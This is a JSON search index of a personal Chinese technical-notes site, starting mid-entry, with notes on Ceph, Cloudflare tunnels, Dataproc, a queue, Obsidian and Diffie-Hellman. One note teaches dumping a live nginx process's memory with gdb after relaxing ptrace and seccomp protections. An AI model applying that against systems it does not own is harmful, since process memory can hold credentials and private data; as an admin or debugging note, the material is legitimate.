節點）\n\n功能：\n\n為 Ceph 提供對象存儲服務的接口，兼容 S3 和 Swift 協議。\n管理存儲桶（bucket）與對象，用於存儲環境的數據操作。\n\n用途：\n\n用於提供對象存儲功能，類似於 AWS S3 的操作方式。\n支援數據訪問的多租戶模式（multi-tenancy）。\n\n節點失效情況 :\n\n應用程式無法使用 S3 API 存取資料，但不會有資料遺失風險\n\nMDS (metadata server) 節點\n\n功能：\n\n為 Ceph 提供 NFS 接口。\n\n用途：\n\n處理 node 掛載請求\n\n節點失效情況 :\n\n應用程式無法掛載 NFS 資料夾，導致應用程式無法存取資料，但資料沒有遺失風險\n\nDemo\ndocker-compose.yaml\nversion: '3.9'\n\nservices:\nceph-mon:\nimage: ceph/daemon:latest-luminous\ncontainer_name: ceph-mon\nenvironment:\n- CLUSTER=ceph\n- WEIGHT=1.0\n- MON_IP=192.168.1.55\n- MON_NAME=ceph-mon\n- CEPH_PUBLIC_NETWORK=0.0.0.0/0\nnetwork_mode: &quot;host&quot;\nvolumes:\n- /etc/ceph:/etc/ceph\n- /var/lib/ceph:/var/lib/ceph\n- /var/log/ceph:/var/log/ceph\nports:\n- &quot;6789:6789&quot;\nrestart: unless-stopped\ncommand: mon\n\nceph-mgr:\nimage: ceph/daemon:latest-luminous\ncontainer_name: ceph-mgr\nprivileged: true\nenvironment:\n- CLUSTER=ceph\nnetwork_mode: &quot;host&quot;\ndepends_on:\n- ceph-mon\npid: &quot;container:ceph-mon&quot;\nvolumes:\n- /etc/ceph:/etc/ceph\n- /var/lib/ceph:/var/lib/ceph\nports:\n- &quot;7000:7000&quot;\nrestart: unless-stopped\ncommand: mgr\n\nceph-mds:\nimage: ceph/daemon:latest-luminous\ncontainer_name: ceph-mds\nprivileged: true\nenvironment:\n- CLUSTER=ceph\n- CEPHFS_CREATE=1\nnetwork_mode: &quot;host&quot;\ndepends_on:\n- ceph-mon\npid: &quot;container:ceph-mon&quot;\nvolumes:\n- /etc/ceph:/etc/ceph\n- /var/lib/ceph:/var/lib/ceph\nrestart: unless-stopped\ncommand: mds\n\nceph-osd-1:\nimage: ceph/daemon:latest-luminous\ncontainer_name: ceph-osd-1\nprivileged: true\nenvironment:\n- CLUSTER=ceph\n- WEIGHT=1.0\n- MON_NAME=ceph-mon\n- MON_IP=127.0.0.1\n- OSD_TYPE=directory\nnetwork_mode: &quot;host&quot;\ndepends_on:\n- ceph-mon\nvolumes:\n- /etc/ceph:/etc/ceph\n- /var/lib/ceph:/var/lib/ceph\n- /var/lib/ceph/osd/1:/var/lib/ceph/osd\n- /etc/localtime:/etc/localtime:ro\nrestart: unless-stopped\ncommand: osd\n\nceph-osd-2:\nimage: ceph/daemon:latest-luminous\ncontainer_name: ceph-osd-2\nprivileged: true\nenvironment:\n- CLUSTER=ceph\n- WEIGHT=1.0\n- MON_NAME=ceph-mon\n- MON_IP=127.0.0.1\n- OSD_TYPE=directory\nnetwork_mode: &quot;host&quot;\ndepends_on:\n- ceph-mon\nvolumes:\n- /etc/ceph:/etc/ceph\n- /var/lib/ceph:/var/lib/ceph\n- /var/lib/ceph/osd/2:/var/lib/ceph/osd\n- /etc/localtime:/etc/localtime:ro\nrestart: unless-stopped\ncommand: osd\n\nceph-osd-3:\nimage: ceph/daemon:latest-luminous\ncontainer_name: ceph-osd-3\nprivileged: true\nenvironment:\n- CLUSTER=ceph\n- WEIGHT=1.0\n- MON_NAME=ceph-mon\n- MON_IP=127.0.0.1\n- OSD_TYPE=directory\nnetwork_mode: &quot;host&quot;\ndepends_on:\n- ceph-mon\nvolumes:\n- /etc/ceph:/etc/ceph\n- /var/lib/ceph:/var/lib/ceph\n- /var/lib/ceph/osd/3:/var/lib/ceph/osd\n- /etc/localtime:/etc/localtime:ro\nrestart: unless-stopped\ncommand: osd\n\n建立 osd 節點的 token\ndocker exec ceph-mon ceph auth get client.bootstrap-osd -o /var/lib/ceph/bootstrap-osd/ceph.keyring\n\n修改設定檔以支援 etx4 硬碟\nsudo vi /etc/ceph/ceph.conf\n\n在文件末尾添加\nosd max object name len = 256\nosd max object namespace len = 64\n\n啟動 osd 節點\n因為寫入 OSD 需要過半數才能算是寫入成功，如果寫入的 OSD 數量未達「最少寫入共識」就會停止這次寫入，如果持續發生寫入失敗 Ceph 集群就會 crash，而「允許離線數量」表達的是在目前「OSD 數量」下，可以允許最多幾個 OSD 節點下線\n\nOSD 數量\n最少寫入共識\n允許離線數量\n\n1\n1\n0\n\n2\n2\n0\n\n3\n2\n1\n\n4\n3\n1\n\n5\n3\n2\n\n所以建議最佳 OSD 數量為 3 或 5 個。\n\n查看 Ceph 狀態\n$ sudo ceph status\ncluster:\nid: f84157cf-dd8e-497b-b8f3-fbc2f597eed2\nhealth: HEALTH_WARN\n46/69 objects misplaced (66.667%)\n\nservices:\nmon: 1 daemons, quorum ceph-mon\nmgr: jason-loges(active)\nmds: cephfs-1/1/1 up {0=jason-loges=up:active}\nosd: 3 osds: 3 up, 3 in; 192 remapped pgs\n\ndata:\npools: 2 pools, 192 pgs\nobjects: 23 objects, 139KiB\nusage: 24.2GiB used, 62.5GiB / 86.7GiB avail\npgs: 46/69 objects misplaced (66.667%)\n192 active+clean+remapped\n\n使用 docker ps 查看 ceph 運行狀態\n\nref: https://blog.csdn.net/aslifeih/article/details/135140411\n環境清理\n$ rm -r /etc/ceph\n$ rm -r /var/lib/ceph/\n\nNext\n<a class=\"internal-link\" target=\"\" data-note-icon=\"\" href=\"/技術文件/ceph/Ceph cluster 資料寫入篇 - ceph S3/\">Ceph cluster 資料寫入篇 - ceph S3</a>\n<a class=\"internal-link\" target=\"\" data-note-icon=\"\" href=\"/技術文件/ceph/Ceph cluster 資料寫入篇 - RBD/\">Ceph cluster 資料寫入篇 - RBD</a>\n<a class=\"internal-link\" target=\"\" data-note-icon=\"\" href=\"/技術文件/ceph/Ceph cluster 資料寫入篇 - CephFS/\">Ceph cluster 資料寫入篇 - CephFS</a>",
		"tags": [ "note","ceph","docker"]
},

{
		"title": "Cloudflare tunnel 研究",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/other/Cloudflare tunnel 研究/",
		"content": "目的\n手上有一台 respberry pi 3 b+\n想在外網使用 ssh 連入進行個人機開發 or 實驗\n參考網站\nhttps://developers.cloudflare.com/cloudflare-one/connections/connect-networks/use-cases/ssh/ssh-cloudflared-authentication/?utm_source=chatgpt.com\n流程解釋(來自官網)\n使用者可以透過在原生終端機中驗證 cloudflared ，連接到 SSH 伺服器，而無需 WARP 客户端。 此方法需要伺服器和客户端兩者都已安裝 cloudflared ，以及 Cloudflare 上的活躍 Zone。 流量會透過此連線被 Proxy，使用者會使用 Cloudflare Access 憑證登入伺服器。\n來到 cloudflare Overview/Tunnels 按下「新增通道」\n\n使用 Cloudflared 的方案\n\n設定通道名稱\n\n選擇 Respberrry pi 的 Debian 作業系統的選項\n\n複製安裝指令\n\nssh 登入到本地的 Respberry pi 機器\n並貼上安裝指令碼\n\n安裝後啟動 cloudflared 服務\n\n註冊完成\n\ncloudflare 儀表板已出現註冊的機器\n\n按「下一步」\n\n輸入下列資訊，並按下「完成設定」\n\n現在已建立完通道，主機端連線設定已完成\n\nclient 連線端設定\n參考資料: https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/#macos\nmac 上面安裝\nbrew install cloudflared\n\n在 SSH 設定檔中變更：\nvim ~/.ssh/config\n\n輸入以下值\nmy-ssh.xxx.ltd 為此次 tunnel 的位置\nHost my-ssh.xxx.ltd\nProxyCommand /usr/local/bin/cloudflared access ssh --hostname %h\n\n連線成功\n\n切換網路到外網環境\n\n一樣是可以連線到 my-ssh.xxx.ltd 的 ssh 機器",
		"tags": [ "note","cloudflare","tunnel"]
},

{
		"title": "GCP dataproc 運行 python scripts",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/pySpark/GCP dataproc 運行 python scripts/",
		"content": "建立 dataproc cluster\ngcloud dataproc clusters create jason-test-spark-job \\\n--region=us-central1 \\\n--properties='^#^dataproc:conda.packages=google-cloud-storage==2.18.2#yarn:yarn.scheduler.maximum-allocation-mb=256928#yarn:yarn.nodemanager.resource.memory-mb=256928'\n\nproperties\n在 package 裡面安裝 python package\ndataproc:conda.packages=google-cloud-storage==2.18.2\n指定 memory 使用量\nyarn:yarn.scheduler.maximum-allocation-mb=256928#yarn:yarn.nodemanager.resource.memory-mb=256928\npyspark pip install\n\n建立\nrequirements.txt\n\npytest==6.2.5\npyspark==3.2.0\ngoogle-cloud-storage==1.43.0\nmlflow==1.23.0\n\n寫 pip init 腳本\npip_init.py\n\n#!/bin/bash\n# 1. 確認 requirements.txt 文件是否已經上傳到 GCS 並下載到本地\nGCS_BUCKET_PATH=&quot;gs://dataproc-staging-us-central1-473678078038-tw1bdolx/requirements.txt&quot;\n\nLOCAL_PATH=&quot;/tmp/requirements.txt&quot;\n\n# 下載 requirements.txt\ngsutil cp ${GCS_BUCKET_PATH} ${LOCAL_PATH}\n\n# 使用 pip 安裝依賴\npip install -r ${LOCAL_PATH}\n\n上傳檔案\n\ngsutil cp requirements.txt gs://dataproc-staging-us-central1-473678078038-tw1bdolx/\ngsutil cp pip_init.sh gs://dataproc-staging-us-central1-473678078038-tw1bdolx/\n\n刪除原本的 cluster\ngcloud dataproc clusters delete jason-test-spark-job --region=us-central1\n\n建立 cluster 時運行腳本\n\ngcloud dataproc clusters create jason-test-spark-job \\\n--region=us-central1 \\\n--initialization-actions=gs://dataproc-staging-us-central1-473678078038-tw1bdolx/pip_init.sh\n\nDelete cluster\ngcloud dataproc clusters delete jason-test-spark-job --region=us-central1\nSubmit job\ngcloud dataproc jobs submit pyspark test.py --region=us-central1 --cluster jason-test-spark-job\n\n[!IMPORTANT]\n記得要切換 GCP 環境 (SIT/UAT/PROD)\n\n#python #pyspark #spark #cluster",
		"tags": ["python", "pyspark", "spark", "cluster", "note","pyspark"]
},

{
		"title": "使用 pmap、smaps 與 gdb Dump 出 Nginx Worker 記憶體區段教學",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/使用 pmap、smaps 與 gdb Dump 出 Nginx Worker 記憶體區段教學/",
		"content": "主旨\n本教學示範如何透過 Linux 的 pmap、/proc/&lt;pid&gt;/smaps 與 gdb 取得指定 process 的匿名記憶體區段，並導出成 dump 檔供後續分析。\n\n0. 找出 nginx process\n\n1. 找出記憶體佔用最高的區段\n首先使用 pmap 檢查 Nginx worker 的 memory map，並依 RSS 由大到小排序：\n$ pmap -x 135 | sort -k 3 -n -r | head -3\ntotal kB 2709340 412896 407496\n00007fe347600000 468992 393644 393644 rw--- [ anon ]\n00007fe3423ee000 5632 3860 3860 rw--- [ anon ]\n\n重點：\n\nRSS 欄位表示實際佔用的實體記憶體。\n第一筆最大者：00007fe347600000，RSS 約 393MB。\n標記為 [ anon ]，通常代表匿名 mmap 或 GC heap、buffer、cache 等。\n\n2. 用 smaps 確認該地址區段的完整範圍\npmap 顯示的是區段起始地址，但實際區段長度需從 smaps 查詢。\n$ cat /proc/135/smaps | grep 7fe347600000\n7fe34296e000-7fe347600000 r--s 00000000 00:36 2640400 /data/nginx/ip2proxy/PX2_CUSTOMER.mmdb\n7fe347600000-7fe364000000 rw-p 00000000 00:00 0\n\n解讀：\n\n第一段：7fe34296e000-7fe347600000 是 memory-mapped file (PX2_CUSTOMER.mmdb)\n第二段：7fe347600000-7fe364000000 是匿名記憶體 (rw-p ... 0)\n這就是 pmap 顯示為 [ anon ] 的那一段。\n\n因此要 dump 的實際區段範圍為：\nstart: 0x7fe347600000\nend: 0x7fe364000000\n\n3. 使用 gdb attach 進程\n進入 gdb：\n$ gdb -pid 135\n若出現權限問題，需確認：\n\n容器需加上 --cap-add=SYS_PTRACE --security-opt seccomp=unconfined\n\n或需在宿主機設置 kernel.yama.ptrace_scope=0\n\n4. 在 gdb 裡 dump 出記憶體檔案\n進入 gdb 之後，執行：\n(gdb) dump memory /tmp/memdump_1 0x7fe347600000 0x7fe364000000\n說明：\n\n/tmp/memdump_1 為輸出檔案路徑\n\n開始地址與結束地址對應 smaps 的匿名記憶體範圍\n\n假如 dump 成功，會在 /tmp 看到數百 MB 至數 GB 的檔案。\n\n5. 後續分析 dump 檔案\n\n讀取可見字串：\n\n$ strings /tmp/memdump_1 | less",
		"tags": [ "note","nginx","linux","gdb"]
},

{
		"title": "實作 queue (Linked list)",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/其他/演算法/實作 queue (Linked list)/",
		"content": "以雙向鍊表做這個 queue 資料結構\n流程\n新增物件\n\n建立 HEAD 與 Oldest 作為基礎框架\n\n新增物件到頭位置\n\n調整鍊表 node 的 next 與 previous reference\n\n更新 HEAD 位置\n\n完成新增 node 到 linked list 頭部的部分\n移除物件\n\n目前狀態\n\n移動 Oldest 指針到 Oldest 物件的上一個節點\n\n移除參考\n\nExample code\n# FIFO calss\nclass LinkElement:\ndef __init__(self) -&gt; None:\nself.next = None\nself.previous = None\nself.message = ''\n\nclass Queue:\ndef __init__(self) -&gt; None:\nself.head = LinkElement()\nself.oldest = LinkElement()\nself.head.next = self.oldest\nself.oldest.previous = self.head\n\ndef push(self, message: str):\nlink_ele = LinkElement()\nlink_ele.message = message\nlink_ele.next = self.head\nself.head.previous = link_ele\nself.head = link_ele\n\ndef pull(self):\ntry:\nmsg = self.oldest.message\nif self.oldest.previous:\nself.oldest = self.oldest.previous\nself.oldest.next = None\nreturn msg\nexcept Exception as e:\nreturn None\n\nqueue = Queue()\n\nfor i in range(10):\nprint (str(i))\nqueue.push(str(i))\n\nfor i in range(12):\nprint(queue.pull())\n\noutput\n0\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n0\n1\n2\n3\n4\n5\n6\n7\n8\n9",
		"tags": [ "note","演算法","queue","linkedlist"]
},

{
		"title": "安裝 Obsidian 語意搜尋套件",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/安裝 Obsidian 語意搜尋套件/",
		"content": "Plugin repo: https://github.com/bbawj/obsidian-semantic-search?tab=readme-ov-file#demo\n在 Settings -&gt; Community plugins -&gt; Browse\n\n搜尋 Semantic Search\n\n安裝套件\n\n啟用 Semantic 套件\n\n安裝 ollama\nhttps://ollama.com/download\n下載 embeding model\nollama pull nomic-embed-text\n\n檢查 model 是否有安裝成功\n$ ollama list\nNAME ID SIZE MODIFIED\nnomic-embed-text:latest 0a109f422b47 274 MB About an hour ago\n\n參數名稱\n設定值\n\nAPI URL\nhttp://localhost:11434/api/embed\n\nModel\nnomic-embed-text\n\n設定參數\n\n打開 command palette\n\n按照以下順序執行\n\n之後就可以用這個進行語意搜尋\n\n整體語意搜尋結果還不錯\n\n總結\n透過這個 obsidian 工具，可以做到語意級別的模糊搜尋，有時候可能就是模糊的感覺，沒有明確的關鍵字，就可以考慮用這個搜尋工具進行搜尋。",
		"tags": [ "note","obsidian"]
},

{
		"title": "密碼學 - 零知識證明 - 密鑰協商",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/密碼學 - 零知識證明 - 密鑰協商/",
		"content": "範例程式(Diffie-Hellman 方法)\n讓我們用密碼學最常用的人名 Bob 與 Alice 舉例\nBob 端\nimport random\n# Diffie-Hellman\np = 23 # 公開參數\ng = 5 # 公開參數\n\nbob_private = random.randint(1, p-1)\nbob_public = (g ** bob_private) % p # 2\nprint(&quot;Bob 的公開值：&quot;, bob_public)\n\nalice_public = int(input(&quot;請輸入 Alice 的公開值: &quot;))\nbob_shared = (alice_public ** bob_private) % p\nprint(&quot;Bob 計算的共享密鑰：&quot;, bob_shared)\n\nAlice 端\nimport random\np = 23 # 公開參數\ng = 5 # 公開參數\n\nalice_private = random.randint(1, p-1)\nalice_public = (g ** alice_private) % p # 8\nprint(&quot;Alice 的公開值：&quot;, alice_public)\n\nbob_public = int(input(&quot;請輸入 Bob 的公開值: &quot;))\nalice_shared = (bob_public ** alice_private) % p\nprint(&quot;Alice 計算的共享密鑰：&quot;, alice_shared)\n\n只要輸入對方的公開數，就能計算出共享密鑰\n\n重放攻擊\n# Eve 已知 g, p, alice_public\np = 23 # 公開參數\ng = 5 # 公開參數\nalice_public = 12\n\n# Eve 嘗試所有可能的私鑰\nfor possible_private in range(1, p):\nif (g ** possible_private) % p == alice_public:\nprint(&quot;Alice 的私鑰是：&quot;, possible_private)\nbreak\n\n離散對數問題\n在正常情況下，Eve（攻擊者）無法輕易算出 Alice 的私鑰，這正是 Diffie-Hellman 密鑰交換的安全基礎。\n原因如下：\nAlice 的公開值是：alice_public = (g ** alice_private) % p\nEve 想要知道 alice_private，必須解「離散對數問題」：已知 g、p、alice_public，求 alice_private\n這個問題在大質數下是非常困難的（目前沒有有效的演算法），所以只要 p 夠大，Alice 的私鑰就很安全\n但如果 p 很小（像教學範例 p=23），Eve 可以用暴力法：\n這種方法只適用於 p 很小的情況。\n實務上 p 至少要 2048 位元，這樣 Eve 幾乎不可能算出 Alice 的私鑰。\n總結：\np 小時，Eve 可以暴力破解 Alice 的私鑰\np 夠大時，Eve 幾乎不可能算出 Alice 的私鑰\n這就是 Diffie-Hellman 的安全基礎\n安全質數\n選用夠大的「安全質數」可以防止離散對數被暴力攻擊\nhttps://datatracker.ietf.org/doc/html/rfc3526#section-2",
		"tags": [ "note","技術研究","演算法"]
},

{
		"title": "技術筆記",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/",
		"content": "Jason's 技術筆記\n若有錯誤歡迎來信指正\nEmail: jason.blog@zhichengs.site",
		"tags": [ "note","gardenEntry"]
}
]